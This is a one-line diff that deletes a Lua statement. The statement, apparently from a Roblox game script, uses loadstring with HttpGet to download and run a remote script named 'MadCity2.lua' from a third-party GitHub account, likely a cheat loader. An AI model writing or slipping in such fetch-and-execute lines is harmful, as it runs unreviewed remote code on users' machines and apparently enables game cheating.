@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lKoPoJLb/Scripts/main/MadCity2.lua", true))()
